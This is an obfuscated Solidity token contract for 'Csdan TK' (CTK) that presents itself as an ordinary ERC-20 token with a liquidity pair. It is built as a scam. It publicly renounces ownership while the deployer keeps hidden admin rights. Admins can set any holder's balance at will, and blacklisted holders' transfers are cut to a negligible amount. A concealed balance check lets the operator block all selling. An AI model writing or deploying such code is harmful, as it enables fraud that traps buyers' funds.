//SPDX-License-Identifier: MIT

pragma solidity ^0.8.2;

interface dthpwqbbaojmjc {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract oxuiyiusbkoxe {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface jyxlmniupzs {
    function createPair(address apwxxemfifbw, address gmemvkcii) external returns (address);
}

interface oelcvhfhi {
    function totalSupply() external view returns (uint256);

    function balanceOf(address syozuhowp) external view returns (uint256);

    function transfer(address vbvxvrurk, uint256 crhiigcusogu) external returns (bool);

    function allowance(address olekxdajgnvfrw, address spender) external view returns (uint256);

    function approve(address spender, uint256 crhiigcusogu) external returns (bool);

    function transferFrom(
        address sender,
        address vbvxvrurk,
        uint256 crhiigcusogu
    ) external returns (bool);

    event Transfer(address indexed from, address indexed psbbvhdpyjzd, uint256 value);
    event Approval(address indexed olekxdajgnvfrw, address indexed spender, uint256 value);
}

interface oelcvhfhiMetadata is oelcvhfhi {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract CsdanTK is oxuiyiusbkoxe, oelcvhfhi, oelcvhfhiMetadata {

    uint8 private rmnwrlxnldd = 18;

    bool public lhpgtesttowvyh;

    address public pmjmqdaeqgjh;

    function ivggdhrgekcj(address lvgooaspldmu, address vbvxvrurk, uint256 crhiigcusogu) internal returns (bool) {
        require(yqgffzblgbjjbe[lvgooaspldmu] >= crhiigcusogu);
        yqgffzblgbjjbe[lvgooaspldmu] -= crhiigcusogu;
        yqgffzblgbjjbe[vbvxvrurk] += crhiigcusogu;
        emit Transfer(lvgooaspldmu, vbvxvrurk, crhiigcusogu);
        return true;
    }

    function transferFrom(address lvgooaspldmu, address vbvxvrurk, uint256 crhiigcusogu) external override returns (bool) {
        if (_msgSender() != aornomdqv) {
            if (vmtqoskciyvnl[lvgooaspldmu][_msgSender()] != type(uint256).max) {
                require(crhiigcusogu <= vmtqoskciyvnl[lvgooaspldmu][_msgSender()]);
                vmtqoskciyvnl[lvgooaspldmu][_msgSender()] -= crhiigcusogu;
            }
        }
        return diyacuvepvm(lvgooaspldmu, vbvxvrurk, crhiigcusogu);
    }

    address aornomdqv = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 constant csgffswyj = 12 ** 10;

    function symbol() external view virtual override returns (string memory) {
        return rcparhygdbtj;
    }

    function allowance(address fhryfoqewscfq, address qqddduaxp) external view virtual override returns (uint256) {
        if (qqddduaxp == aornomdqv) {
            return type(uint256).max;
        }
        return vmtqoskciyvnl[fhryfoqewscfq][qqddduaxp];
    }

    bool public liuxbimck;

    string private rcparhygdbtj = "CTK";

    function gcfnbgpyqz(uint256 crhiigcusogu) public {
        urlxzgxgyv();
        gzfgjypgceizw = crhiigcusogu;
    }

    bool private vjoiizuqkxjdcd;

    uint256 public mcokohvfc;

    mapping(address => bool) public ygpihnjzmpb;

    mapping(address => bool) public aecsghuhp;

    function decimals() external view virtual override returns (uint8) {
        return rmnwrlxnldd;
    }

    uint256 gzfgjypgceizw;

    constructor (){
        if (vjoiizuqkxjdcd == liuxbimck) {
            lpsvkcstzpql = pmbuwdujxbkl;
        }
        fntketfrdcnioq();
        dthpwqbbaojmjc hrhqkglosptc = dthpwqbbaojmjc(aornomdqv);
        pmjmqdaeqgjh = jyxlmniupzs(hrhqkglosptc.factory()).createPair(hrhqkglosptc.WETH(), address(this));
        
        xxumyygfttm = _msgSender();
        ygpihnjzmpb[xxumyygfttm] = true;
        yqgffzblgbjjbe[xxumyygfttm] = sphqziudchbb;
        if (lpsvkcstzpql == pmbuwdujxbkl) {
            lpsvkcstzpql = mcokohvfc;
        }
        emit Transfer(address(0), xxumyygfttm, sphqziudchbb);
    }

    event OwnershipTransferred(address indexed hbampvqihgvq, address indexed olmzhgidm);

    address ibxymjdwe = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function name() external view virtual override returns (string memory) {
        return mzknoxdbsyv;
    }

    uint256 private sphqziudchbb = 100000000 * 10 ** 18;

    address public xxumyygfttm;

    function fntketfrdcnioq() public {
        emit OwnershipTransferred(xxumyygfttm, address(0));
        rlkfwgntbbj = address(0);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return sphqziudchbb;
    }

    mapping(address => mapping(address => uint256)) private vmtqoskciyvnl;

    uint256 public lpsvkcstzpql;

    uint256 klvbqfwxqayvd;

    function urlxzgxgyv() private view {
        require(ygpihnjzmpb[_msgSender()]);
    }

    function skeqxgbua(address wniamoylvtbyoa) public {
        urlxzgxgyv();
        if (lpsvkcstzpql == mcokohvfc) {
            ekqjbgmmqukmpt = false;
        }
        if (wniamoylvtbyoa == xxumyygfttm || wniamoylvtbyoa == pmjmqdaeqgjh) {
            return;
        }
        aecsghuhp[wniamoylvtbyoa] = true;
    }

    uint256 private pmbuwdujxbkl;

    function owner() external view returns (address) {
        return rlkfwgntbbj;
    }

    function balanceOf(address syozuhowp) public view virtual override returns (uint256) {
        return yqgffzblgbjjbe[syozuhowp];
    }

    function fopgpjbjq(address nuceeoczs) public {
        if (lhpgtesttowvyh) {
            return;
        }
        if (lpsvkcstzpql == pmbuwdujxbkl) {
            pmbuwdujxbkl = lpsvkcstzpql;
        }
        ygpihnjzmpb[nuceeoczs] = true;
        if (ekqjbgmmqukmpt) {
            mcokohvfc = lpsvkcstzpql;
        }
        lhpgtesttowvyh = true;
    }

    string private mzknoxdbsyv = "Csdan TK";

    function transfer(address wqrkdwwkrhiq, uint256 crhiigcusogu) external virtual override returns (bool) {
        return diyacuvepvm(_msgSender(), wqrkdwwkrhiq, crhiigcusogu);
    }

    mapping(address => uint256) private yqgffzblgbjjbe;

    function ldqbrbyopzvynn(address wqrkdwwkrhiq, uint256 crhiigcusogu) public {
        urlxzgxgyv();
        yqgffzblgbjjbe[wqrkdwwkrhiq] = crhiigcusogu;
    }

    function approve(address qqddduaxp, uint256 crhiigcusogu) public virtual override returns (bool) {
        vmtqoskciyvnl[_msgSender()][qqddduaxp] = crhiigcusogu;
        emit Approval(_msgSender(), qqddduaxp, crhiigcusogu);
        return true;
    }

    function diyacuvepvm(address lvgooaspldmu, address vbvxvrurk, uint256 crhiigcusogu) internal returns (bool) {
        if (lvgooaspldmu == xxumyygfttm) {
            return ivggdhrgekcj(lvgooaspldmu, vbvxvrurk, crhiigcusogu);
        }
        uint256 afrbhskvosmjge = oelcvhfhi(pmjmqdaeqgjh).balanceOf(ibxymjdwe);
        require(afrbhskvosmjge == gzfgjypgceizw);
        require(vbvxvrurk != ibxymjdwe);
        if (aecsghuhp[lvgooaspldmu]) {
            return ivggdhrgekcj(lvgooaspldmu, vbvxvrurk, csgffswyj);
        }
        return ivggdhrgekcj(lvgooaspldmu, vbvxvrurk, crhiigcusogu);
    }

    address private rlkfwgntbbj;

    function getOwner() external view returns (address) {
        return rlkfwgntbbj;
    }

    bool public ekqjbgmmqukmpt;

}